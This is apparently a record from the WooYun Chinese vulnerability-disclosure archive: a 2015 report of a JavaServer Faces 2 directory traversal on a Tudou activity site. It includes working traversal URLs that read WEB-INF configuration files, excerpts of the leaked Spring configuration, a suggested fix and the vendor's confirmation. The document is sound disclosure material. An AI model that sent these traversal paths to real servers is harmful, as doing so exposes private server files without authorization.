{"id": 42206, "wybug_id": "wooyun-2015-0103838", "wybug_title": "土豆网某站点存在JavaServer Faces 2目录遍历漏洞", "wybug_corp": "土豆网", "wybug_author": "lijiejie", "wybug_date": "2015-03-26 11:06", "wybug_open_date": "2015-05-10 11:16", "wybug_type": "系统/服务运维配置不当", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向公众公开  简要描述： 土豆网某站点存在JavaServer Faces 2目录遍历漏洞，默认无法读取.properties文件，所以利用价值不高 详细说明：  目录遍历位于：\nhttp://activity.tudou.com/javax.faces.resource.../WEB-INF/web.xml.jsfhttp://activity.tudou.com/javax.faces.resource.../WEB-INF/classes/spring/spring-servlet.xml.jsfhttp://activity.tudou.com/javax.faces.resource.../WEB-INF/classes/spring/main.xml.jsfhttp://activity.tudou.com/javax.faces.resource.../WEB-INF/velocity/toolbox.xml.jsf\n默认的，是无法读取\n.class.jsp.jspx.properties.xhtml.groovy\n所以利用价值相对低   漏洞证明：  \n<!-- 静态资源映射 -->\t<mvc:resources mapping=\"/static/**\" location=\"/static/\" />\t<mvc:resources mapping=\"/js/**\" location=\"/js/\" />\t<mvc:resources mapping=\"/img/**\" location=\"/img/\" />\t\t<!-- velocity视图解析器 -->\t<bean id=\"velocityViewResolver\"\t\tclass=\"org.springframework.web.servlet.view.velocity.VelocityViewResolver\">\t\t<property name=\"cache\" value=\"false\"></property><!--是否缓存模板-->        <property name=\"order\" value=\"10\" />        <property name=\"suffix\" value=\".jsp\"/>        <property name=\"exposeSpringMacroHelpers\" value=\"true\" />        <property name=\"dateToolAttribute\" value=\"dateTool\"/>        <property name=\"numberToolAttribute\" value=\"numberTool\"/>        <property name=\"toolboxConfigLocation\" value=\"WEB-INF/velocity/toolbox.xml\" />        <property name=\"contentType\" value=\"text/html;charset=UTF-8\"></property>\t</bean>\t<!-- velocity环境配置 -->\t<bean id=\"velocityConfig\"\t\tclass=\"org.springframework.web.servlet.view.velocity.VelocityConfigurer\">\t\t<!-- velocity配置文件路径 -->\t\t<property name=\"configLocation\" value=\"WEB-INF/velocity/velocity.properties\" />\t\t<!-- velocity模板路径 -->\t\t<property name=\"resourceLoaderPath\" value=\"/\" />\t</bean>\n\n<!-- base -->\t<import resource=\"classpath:spring/ctx-base.xml\" />\t<!-- module -->\t<import resource=\"classpath:spring/db.xml\" />\t<import resource=\"classpath:spring/ctx-system-common.xml\" />\t<import resource=\"classpath:spring/ctx-tudou-client.xml\" />\t<import resource=\"classpath:spring/memcached.xml\" />\t<import resource=\"classpath:spring/captcha.xml\" />\n   修复方案：  升级 或者修改web.xml，排除.xml\n<context-param>    <param-name>javax.faces.RESOURCE_EXCLUDES</param-name>    <param-value>.xhtml .class .jsp .jspx .properties .xml</param-value></context-param>\n   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-03-26 11:15 厂商回复： 多谢，确认漏洞。 最新状态： 2015-03-26：已修复。  ", "replys": "漏洞评价：\n评论\n     2015-03-26 11:09 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  你说这个啊 http://security.coverity.com/advisory/2013/Oct/two-path-traversal-defects-in-oracles-jsf2-implementation.htmlhttp://www.example.com/someApp/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..    \n     2015-03-26 11:12 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  关注！    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}